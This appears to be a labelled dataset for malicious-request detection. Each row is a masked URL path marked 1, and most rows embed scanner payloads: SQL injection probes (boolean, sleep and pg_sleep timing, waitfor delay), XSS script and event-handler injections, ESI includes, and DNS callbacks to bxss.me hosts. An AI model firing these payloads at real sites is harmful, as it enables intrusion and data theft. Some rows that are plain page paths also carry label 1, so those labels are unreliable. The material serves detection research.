sentences	labels
vc/**/lib"" and 2*3*8=6*8 and ""3dhd""=""3dhd/security/sm2_util.js 	 1
js/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 1
2021zt/******/2021/03/15/javascript:void(); 	 1
wzdt/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
zwgk/****/bmyjs/zzqdwzfbmgljgsydw/ygcdryzzs/\"javascript:void(0)\" 	 1
zwgk/*****/5619/5625/\"javascript:void(0)\" 	 1
index/******/2019/03/22/javascript:void(); 	 1
hdjl/****/202103'""()&%<acx><script >0gna(9394)</script>/t20210303_2614145.html 	 1
xxgk/'.gethostbyname(lc('hitwa'.'wqcgmnhy36344.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(80).chr(99).chr(74).'/****/1110/list.html 	 1
newscenter/******/2012/09/14/010886815.shtml 	 1
ztpd/******/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
index.php/****/findpass_msg.html?ac=email' and 2734=2624 and 'vjqz'='vjqz 	 1
nul//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 1
was5/***/search/search?page=3&channelid=287219&searchword=1' and 8114=5748 and 'zlep'='zlep&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
2017zt/******/2017/12/21/javascript:window.print() 	 1
col/******/index.html/<img src="javascript:alert(6383)"> 	 1
xxgk/******/news/show/title/time-for-a-heavy-harvest-new-release/src/"><script>alert(777)</script>@random4cd201e063d5c 	 1
was5/***/search?page=2&channelid=253477&searchword=1%' or 2025=8266 and '%%'='%&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
gygj/****/lkgx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
was5/***/search?page=2&channelid=253477 and 3892=5327--&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
xwdt/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/gzdt/144.htm 	 1
vc' and 2*3*8=6*8 and '1blf'='1blf/**/lib/jquery/jquery.min.js 	 1
aux/*******/gvideos.php?gid=1 and 1=2 	 1
newscenter/******/2021/09/07'"/><img src=javascript:alert(810) /013447361.shtml 	 1
jsearchfront/********/jcse/110105008056111/http://bxss.me/t/fit.txt/images/main.css 	 1
(select(0)from(select(sleep(43.368)))v)/*' (select(0)from(select(sleep(43.368)))v) '"" (select(0)from(select(sleep(43.368)))v) ""*//******/ 	 1
/***********/ui/lib/easyui/plugins/jquery.panel.js 	 1
xwdt/****/zjdt/zcwj/64.htm 	 1
zzsl/**/yw_1280/\"javascript:void(0)\" 	 1
xwzx' and 2*3*8=6*8 and 'dsfl'='dsfl/****/jtwxq/ 	 1
z/******/news/show/title/time-for-a-heavy-harvest-new-release/src/"><script>alert(777)</script>@random4cd201e063d5c 	 1
was5/***/search?channelid=299868%' and 7466=7466 and '%'='&perpage=1000 	 1
qhly/******/2021/09/01'""/><iframe src=javascript:alert(1822) /013442863.shtml 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(4697)">?_=1630312101338 	 1
licaijzgg/********/javascript:void(0); 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(488)</script>?_=1630311430045 	 1
yqlj/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 1
'""()&%<acx><script >ikcd(9168)</script>/****/sgaj/ 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/**/encrypt/jbase64.js 	 1
shzr/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
aux/******/common/newaccount.aspx?btncancel=alert(777) 	 1
nbfw/*********/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 	 1
lz/******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
ztpd/***********/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
xwzx/'.gethostbyname(lc('hitjz'.'uxsdohtfd5a3f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(103).chr(78).chr(105).chr(82).'/****/ 	 1
2021zt/******/2021/03/13/javascript:void(); 	 1
xxgk/*****/'""()&%<acx><script >u5ff(9486)</script>/1110/list.html 	 1
lz/******/2020/12/31/javascript:void(0); 	 1
2019zt/******/2019/09/26/012981580.shtml 	 1
xxgk/******/http://bxss.me/t/xss.html? 	 1
igi/****/opengovmsgbox.do?pageindex=1' waitfor delay '0:0:2&siteid=115&method=listgovmsgboxs&pagesize=15&appid=4 	 1
cn/**/info_37.aspx?itemid=1524 and 7436=2228 	 1
if(now()=sysdate(),sleep(12),0)/****************/index_2.html 	 1
images//***/4fv8d5zw/xhr_send?t=1629431587665 	 1
qywh/****/xfgj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
wp-content/******/rocked/jnk.php 	 1
zwgk/****/http://bxss.me/t/fit.txt?.jpg/gdyx/ 	 1
zwgk/******/bzxajgc' and 2*3*8=6*8 and 'snbh'='snbh/szss/plx.htm 	 1
newscenter/******/2021/12/13/javascript:void(0); 	 1
/***********/jslib/grouppic/jquery.ad-gallery.js 	 1
service/**/setpassguardctrl?id=1 	 1
socket.gethostbyname('hitsg' 'bwttwtqg20814.bxss.me.')[3].to_s) '/**/images/result.css 	 1
zwgk/*******/fdzdgknr/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/1.htm 	 1
yqlj/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
swld/******/2021/06/12/javascript:window.close(); 	 1
ssjn/****/http://bxss.me/t/xss.html? 	 1
fr/******/common/newaccount.aspx?btncreateaccount=alert(777) 	 1
newscenter/******/<script>alert(924)</script>/013447361.shtml 	 1
gygj/****/whhd/ 	 1
bxss.me/*/jquery.db_tabmotionbanner.min.js 	 1
newscenter/******/2021/12/06/javascript:window.print() 	 1
xxgk/******/2009/list.html?new=0.23190916418329843<esi:include src=""http://bxss.me/rpb.png""/> 	 1
en/********/industrialmachinery/201505/t20150513_60352.html/*/-->'""></iframe></script></style></title></textarea><script >alert(83420)</script> 	 1
xxgk/******/javascript:void(0); 	 1
skin/**/encrypt'||'/md5.js 	 1
xxgk/******/tjj/zfxxgkml_2127/hygq_2064/http://bxss.me/t/xss.html? 	 1
newscenter/****/? 	 1
xxgk/******/tjj/zfxxgkml'||'_2127/jytabljg_2061/list.html 	 1
if(now()=sysdate(),sleep(12),0)/******/gczlzl/1.htm 	 1
bxss.me/**/widgets/scrollup/js/jquery.scrollup.min.js 	 1
lcgg/********/javascript:void(0); 	 1
zwgk/******/bxss.me/t/xss.html? 	 1
module/*****/urite/0""xor(if(now()=sysdate(),sleep(15),0))xor""z.js 	 1
outurl/****/gallery1.php?g_name=<script>alert(77729</script> 	 1
script%' and 2*3*8=6*8 and '9kuy'!='9kuy%/*/1905151614057782.js 	 1
newscenter/******/2021/12/12/javascript:void(0); 	 1
'""()&%<acx><script >5il4(9325)</script>/********/jcse/110105008056111/16/images/catesearchbtn.js 	 1
jsearchfront/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=bxss.me/*/xss.html? 	 1
xxgk/******/zdmsxx/list.html?new=/xfs.bxss.me 	 1
xq/******/count/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
index/******/2020/09/16/javascript:void(0); 	 1
fr/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
socket.gethostbyname('hitfy' 'bcwdaevf889b3.bxss.me.')[3].to_s) '/****/website.js 	 1
qyzz/***/ltgsz.com?n=11') and 3458=(select 3458 from pg_sleep(5)) and ('vaje'='vaje 	 1
zmhd/*****/hfswsj<esi:include src=""http://bxss.me/rpb.png""/>/zmhdyc.html 	 1
module/**********/visit.jsp?i_columnid=1&i_webid=1&type[0]==2and 3 in &type[1]=3'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1738801731')))>'0 	 1
zwgk/******/ncwywfgz'||'/ycs/hlx/xmb_gzdxb.htm 	 1
jsearchfront/********/jcse/110105008056111/16<esi:include src=""http://bxss.me/rpb.png""/>/images/jquery.autocomplete.js 	 1
pdfreader/***/viewer.html?file=/uploadimg/gqtb/2019063pdf') and 6656=6656 and ('owpf'='owpf 	 1
es/******/common/newaccount.aspx?email=alert(777) 	 1
col/****/index.html/<img src="javascript:alert(324)"> 	 1
xxgk/******/tjj/zfxxgkml_2127/xwfbh_2065/list.html?new=/xfs.bxss.me 	 1
newscenter/******/2021/09/07'""/><img src=x onerror=alert(822)>/013447361.shtml 	 1
en/**************/csrreports/ 	 1
system'||'/********/js/newcalendar/wdatepicker.js 	 1
css/****/?app=article&view=item31ab2"">alert(777)0ccba&id=186 	 1
newscenter/******/2021/12/03/javascript:window.close(); 	 1
pic/*/00/52/15/521554_798511.jpg 	 1
lz/*******/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) 	 1
nbfw/******/common/signin.aspx?btnsignin=alert(777)returnurl=/******/common/default.aspx 	 1
zwgk/******/\"javascript:void(0)\" 	 1
ywly/****/wjwszzgc/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
fr/****/xwygx/202109/t20210930_317981.html and 1=1 	 1
ru/********/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
newscenter/******/2021/11/11/javascript:void(); 	 1
vc/**/lib/easyui/themes'||'/bootstrap/panel.css 	 1
xxgk/******/gjjj/ 	 1
gygj/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin 	 1
zwgk/*****/5619/5629/index.html 	 1
was5/***/search?page=2&channelid=253477') and 8927=8927 and '1'='1&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
xxgk/******/2012<esi:include src=""http://bxss.me/rpb.png""/>/list.html 	 1
cpsms/********/javascript:void(0); 	 1
was5/***/search?page=2%') or 7878=2737 and '%'='&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
xwzx/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/2021_mtgz/******/t20210505_273338.html 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(3731)</script>?_=1630312025768 	 1
pdfreader/***/viewer.html?file=/uploadimg/gqtb/2019063pdf and 6656=6656 	 1
2017zt/******/2018/01/18/javascript:window.close(); 	 1
sjsb/******/lists?cid=1 ) order by 1 desc,extractvalue(rand(),concat(0x7c,md5(982281901))) desc -- a 	 1
zwgk/******/ncwywfgz/szss/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/xmb_gzdxb.htm 	 1
system%' and 2*3*8=6*8 and 'ruw2'!='ruw2%/********/js/counter.js 	 1
qhly/******/2017/03/02/javascript:window.close(); 	 1
lz/******/2021/10/31/javascript:void(0); 	 1
pic/****/?app=article&view=item31ab2"">alert(777)0ccba&id=186 	 1
xwdt/****/czjs/zcwj/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
lcgg/********/javascript:void(0); 	 1
xq/******/2020/10/30/javascript:void(0); 	 1
jsearchfront/********/jcse/website<esi:include src=""http://bxss.me/rpb.png""/>.js 	 1
newscenter/******/2017/10/17/012441833.shtml 	 1
zwgk/****/if(now()=sysdate(),sleep(12),0)/mhw.htm 	 1
xq/******/2021/08/19/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
2017zt/******/2017/11/10/javascript:window.print() 	 1
kjcx/****/wlzb/201610/t20161014_103595.html' and 'x'='y 	 1
zfld/******/2021/10/16/javascript:window.close(); 	 1
ywly/*****/index.html?continent=') and 7395=0560 and ('1'='1 	 1
2016zt/******/2016/08/03/javascript:void(0); 	 1
module/**********/visit.jsp/"><script>alert(5754)</script>?type=2&i_webid=1&i_columnid=131 	 1
ywly/****/qcgc/ 	 1
x241/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
zmhd/*****/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/zmhdyc.html 	 1
lcgg/********/javascript:void(0); 	 1
module/**********/visit.jsp?type=2&i_webid=1&i_columnid=4979 	 1
lz/******/2021/08/09/javascript:void(0); 	 1
jsearchfront/********/jcse/110105008056111/16/'""()&%<acx><script >cfou(9843)</script>/result.css 	 1
news/**************/:http://bxss.me/t/xss.html? 	 1
index/******/2020/05/04/javascript:void(0); 	 1
newscenter/******/2021/09/25/javascript:void(); 	 1
xxgk/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 1
z/******/bxss.me/t/xss.html? 	 1
aux/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 1
index/******/2021/11/28/javascript:window.print() 	 1
qhsw/******/2021/04/14/javascript:void(); 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 6521=6521 and '1'='1 	 1
2016zt/******/2016/12/08/javascript:window.close(); 	 1
cgi-bin/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin 	 1
xwdt/zjdt'||'/****/gzdt/144.htm 	 1
module/*****/bxss.me/ckplayer.js 	 1
xxgk/******/http://bxss.me/t/fit.txt.html 	 1
2021zt/******/2021/06/09'""/>//</script//>//<svg/onload=alert(2377) width=100///>/013399706.shtml 	 1
ywly/****/jcgc/images/ 	 1
was5/***/search/search?page=3&channelid=287219&searchword=1%' and 6601=(select 6601 from pg_sleep(5)) and '%'='&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
news/********/zhongguoqiyejiaboluntan?page=1'"()&%<acu><script>9112(9131)</script> 	 1
include/*******/good.php 	 1
zmhd/*****/http://bxss.me/t/fit.txt/zmhdyc.html 	 1
phpcms/*********/en/announce.lang.php 	 1
xxgk/******/2012/list'||'.html 	 1
skin%' and 2*3*8=6*8 and 'r3gi'!='r3gi%/**/lib/jquery.js 	 1
templates/********/index.aspx?nodeid=394 and 8738=2345-- sfoi 	 1
system/********/if(now()=sysdate(),sleep(12),0)/newcalendar/wdatepicker.js 	 1
xwzx/****/2020_zdgz/202012/t20201216_265034.html and 1=1 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 3573=6201 and '1'='1 	 1
ztzl/*****/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 1
vc' and 2*3*8=6*8 and '3kvq'='3kvq/**/widgets/scrollup/css/themes/image.css 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=-1) or 6352=4914#&token=1 	 1
synr/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 1
en/***********/rdandmanufacture/201412/t20141210_22173.html and 1>1 	 1
zwgk/******/fdzdgknr/http://bxss.me/t/xss.html? 	 1
ywzzq//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 1
zwgk/*****/5619/5631/\"javascript:void(0)\" 	 1
jsearchfront/http://*******/t/fit.txt/jcse/110105008056111/16/images/catesearchbtn.js 	 1
index/******/2021/01/21'"/><iframe src=javascript:alert(1167)>/013323672.shtml 	 1
2016zt/******/2017/08/06/javascript:window.print() 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/mainframe/js.js/""><script>alert(4654)</script> 	 1
css/*****/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 1
web/********/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_a5de4870247a68693b47ac0f8b9c401b/><!--<textarea> 	 1
jsearchfront/********/jcse/110105008056111/16/http://bxss.me/t/fit.txt/css.js 	 1
system/********/js/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/wdatepicker.js 	 1
news/********/yanjiubaogao?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(67342)</script> 	 1
was5/***/search?channelid=254846&searchword=ÃÏΩÚ') and 9304=9304 and ('ymdd'='ymdd 	 1
cgi-bin/*******/count.cgi 	 1
system/********/js/newcalendar/my97datepicker%' and 2*3*8=6*8 and 'scfw'!='scfw%.htm 	 1
xq/********/loggedout.jsp?locale=""><script>alert(777)</script> 	 1
inc/*******/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) 	 1
zwgk/****/leader' and 2*3*8=6*8 and 'kanp'='kanp/mhw.htm 	 1
art/****/12/14/art_0""xor(if(now()=sysdate(),sleep(15),0))xor""z_223612.html 	 1
xxgk/*****/1088/bxss.me/list.html 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(823)">?_=1630311603075 	 1
vc/*****/ 	 1
2021zt/**/"><script>alert(49)</script> 	 1
con/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 1
swld/******/2021/11/13/javascript:window.close(); 	 1
jsearchfront/**********/autocomplete.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&tpl=16&websiteid=110105008056111 	 1
ru/***/alert(777) 	 1
xwdt/zjdt' and 2*3*8=6*8 and 'eodd'='eodd/****/gzdt/144.htm 	 1
module/**********/visit.jsp?type=1&i_columnid=1&i_webid=1 and 1>1 	 1
zwgk/zdlygk' and 2*3*8=6*8 and 'y8rc'='y8rc/*******/gys.htm 	 1
e/******/showinfo/?classid=if(now()=sysdate(),sleep(22),0)&id=10299 	 1
con//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 1
jsearchfront'""()&%<acx><script >uzie(9280)</script>/********/jcse/110105008056111/16/images/main.css 	 1
newscenter/******/2021/11/02/javascript:window.close(); 	 1
col/******/index.html/"><script>alert(209)</script> 	 1
index/******/2021/11/21/javascript:window.close(); 	 1
nbfw/******/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 1
index/******/2019/11/06/javascript:void(); 	 1
jsearchfront/********/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/plugin/voice/voice.css 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/selectpick/'""()&%<acx><script >ap8q(9543)</script>.js 	 1
n42752/n239584'||'/*******/n239626/index.html 	 1
inc/******/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1%') or 7298=7298 /*&orderby=-docreltime&perpage=15&outlinepage=10 	 1
newscenter/******/2021/06/30/javascript:window.close(); 	 1
live/*/433209.html 	 1
ztzl/wp-content/*******/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= 	 1
lz/******/2021/07/31/012187653.shtml' and 'x'='y 	 1
jsearchfront/search.do?params<esi:include src=""http://*******/rpb.png""/> 	 1
xxgk/**********/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 1
qhly/******/2013/08/09/javascript:dozoom(14) 	 1
art/****/'""()&%<acx><script >kunb(9890)</script>/12/art_32_242398.html 	 1
swld/******/2021/12/04/javascript:window.close(); 	 1
xxgk/*****/"".gethostbyname(lc(""hiten"".""oorieflv73b78.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(121).chr(66).chr(116).chr(75).""/1081/list.html 	 1
xxgk/******/zfczyjs/list'""()&%<acx><script >vmvx(9360)</script>.html 	 1
newscenter/******/2008/10/28/002623071.shtml 	 1
zwgk'||'/******/fdzdgknr/qtfdxx/ 	 1
prn/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
xxgk/"".gethostbyname(lc(""hitnw"".""gkmdojeq573e4.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(107).chr(87).chr(101).chr(71).""/****/list.html 	 1
zwgk/******/bzxajgc'||'/gys/jyx.htm 	 1
ywzzq/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
index/******/more/405000000000000/0001/javascript:void(); 	 1
gjcp/****/?app=article&view=item31ab2"">alert(777)0ccba&id=186 	 1
nul/**********/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 	 1
xwzx/****/2019_mtgz/ and 1=1 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime and 4869=4869--&perpage=15&outlinepage=10 	 1
zwgk%' and 2*3*8=6*8 and 'wkjp'!='wkjp%/****/leader/mhw.htm 	 1
newscenter/******/2012/12/28/010989495.shtml 	 1
ldzc/*****/sz/202108/t20210806_185416<esi:include src=""http://bxss.me/rpb.png""/>.html 	 1
rlzy/****/" and "x"="y 	 1
bxss.me/***/language.js 	 1
yqlj/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 1
xxgk/*****/1088/1096/list.html?new=0.42873000590672894'""()&%<acx><script >5bfy(9087)</script> 	 1
module/**********/visit.jsp?i_articleid=221610&i_columnid=31&i_webid=1&type=if(now()=sysdate(),sleep(15),0) 	 1
socket.gethostbyname(""hitak"" ""sohnpvwm9fa9f.bxss.me."")[3].to_s) ""/*******/css/jpage.css 	 1
cfide/*****/cf_debugfr.cfm?userpage=test 	 1
module/**********/visit.jsp?i_columnid[0]=exp&i_columnid[1]==1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1553079348')))>'0&i_webid=1&type=1 	 1
uploadfile/******/uid/0x0.php 	 1
system/********/code/datainput.jsp?owner=%' and 4711=4701 and '%'=' 	 1
socket.gethostbyname('hittr' 'huljsytk988f9.bxss.me.')[3].to_s) '/*********/pinterest_grid.js 	 1
xq/******/2021/01/07/javascript:void(0); 	 1
ztpd/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 1
system/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/**/newcalendar/wdatepicker.js 	 1
xwzx/*****/2020_qydt/' and 'x'='x 	 1
lccp/********/javascript:void(0); 	 1
xq/******/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test 	 1
xwzx/mtgz%' and 2*3*8=6*8 and 'zodq'!='zodq%/2021_mtgz/******/t20210505_273338.html 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1') or 5818=3927 and '1'='1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
plugins/*****************/web/*****************/swf//swfupload_f8.swf?moviename="]);}catch(e){}if(!self.a)self.a=!alert(1);// 	 1
newscenter/******/2021/03/19/javascript:void(); 	 1
en/***********/projectcontracting/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
bxss.me/****/demo12.html 	 1
module/***/rssfeed.jsp?colid=34%' and 4031=3943 and '%'=' 	 1
xwdt/****/zjdt/zcwj/17.htm 	 1
jsearchfront/'""()&%<acx><script >xiko(9762)</script>/****/110105008056111/16/images/condition.js 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(885)</script>?_=1630311631350 	 1
ywly/*****/index.html?continent=' or 9847=9847 and '1'='1 	 1
system/********/code/datainput.jsp?owner=%' and 3032=2797  	 1
zwgk/****/leader'||'/mhw.htm 	 1
qtyz/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 	 1
ztzl//***/q7wglb3b/xhr_send?t=1632378273221 	 1
zwgk/******/gytdsdfwzs%' and 2*3*8=6*8 and '4gyw'!='4gyw%/zws/zcwj.htm 	 1
lccp/********/javascript:void(0); 	 1
e/******/addinfo.php?submit=ÃÌº”–≈œ¢&classid=1&enews=maddinfo'""()&%<acx><script >87cm(9859)</script>&mid=1 	 1
qhly/******/2021/11/25/javascript:window.close(); 	 1
zwgk/******/ncwywfgz/zws/hyx/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  	 1
xinanyanjiu/**************/2021-10-13/javascript:void(0) 	 1
system/********/js/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.js 	 1
zfld/******/2021/11/28/javascript:window.print() 	 1
xwzx/****/2020_jtyw/ and 1=1 	 1
wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=1&day=1&month=5&pag=1&year=2018" and 1=dbms_pipe.receive_message(7d,15) and "1"="1 	 1
lz/******/count/0006000/000000000000/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
index/******/2019/04/02/javascript:window.close(); 	 1
xxgk/******/zyrsbd/" and "x"="y 	 1
qhsw/******/2021/04/22/javascript:void(0); 	 1
system/********/interview/room.jsp?wbinterviewid=1033') or 3971=3971  	 1
vc/**/lib"" and 2*3*8=6*8 and ""m7n4""=""m7n4/jquery/jquery.min.js 	 1
col/*****/bxss.me/t/xss.html? 	 1
public/*************/ajax_managed_services.php 	 1
was5/***/search?channelid=299868' or 4002=4002  	 1
zmhd/*****/hfswsj/202109/t20210906_/xfs.bxss.me.html 	 1
qhly/******/2017/03/21/javascript:dozoom(14) 	 1
socket.gethostbyname('hitjh' 'hjpzqvdc39bb7.bxss.me.')[3].to_s) '/****/list.html 	 1
zwgk'||'/******/ncwywfgz/ycs/hlx/xmb_gzdxb.htm 	 1
vc/http://*******/t/fit.txt?.jpg/css/page.css 	 1
zwgk'||'/*******/fdzdgknr/ysjs/1.htm 	 1
lcgg/********/javascript:void(0); 	 1
system/********/js/newcalendar/my97datepicker.htm 	 1
"".gethostbyname(lc(""hithj"".""walyzwgb4711b.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(98).chr(83).chr(97).chr(80).""/******/tjj/zfxxgkml_2127/jgzn_2042/list.html 	 1
index/******/2015/12/31/011902792_02.shtml 	 1
skin/**/jsencrypt/jsencrypt.min.js;;";;alert(326);;s=" 	 1
vc/**/lib/easyui/bxss.me/jquery.panel.js 	 1
was5/***/search?page=2&channelid=253477&searchword=1%' or 7588=7588 and '%'='&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
xxgk/*****/1088/1090/list.html?new=bxss.me/t/xss.html? 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(6266)">?_=1630312280760 	 1
qhly/******/2017/01/24/javascript:dozoom(12) 	 1
pic/*/01/69/55/1695522_264351.jpg 	 1
ywly/****/nygc/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
jsearchfront/********/jcse/'""()&%<acx><script >qamc(9686)</script>/16/images/main.css 	 1
zwgk/zdlygk' and 2*3*8=6*8 and '4iog'='4iog/**********/1.htm 	 1
news/********/yuanquzhaoshang?page='""()&%<acx><script >j10g(9522)</script> 	 1
